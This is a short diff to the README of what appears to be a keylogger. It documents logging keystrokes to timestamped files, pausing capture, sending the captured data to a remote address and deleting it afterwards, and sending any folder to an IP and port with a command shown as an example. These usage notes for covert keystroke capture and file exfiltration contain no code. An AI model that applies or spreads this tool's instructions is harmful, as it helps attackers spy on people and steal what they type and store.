@@ -14,7 +14,7 @@ Keystrokes are logged in timestamp.txt(e.g. 0713164723.txt). Function keys like 
 2 - pause capture
 3 - send captured data, delete after send, continue capture
 4 - send captured data, delete after send, pause capture
-5 - send any data in path followed argument.(e.g. `ai send xx.xx.xx.xx:80 5 d:\\foldername`)
+path - send any data in path followed argument.(e.g. `ai send xx.xx.xx.xx:80 d:\\foldername`)
 **important note: I couldn't test with folder which its name contain space like "dev tools" or "windows 10".
 if you give space, the word followed space will be set as next argument. if you need to copy even folder with space in its name, contact me.**
 
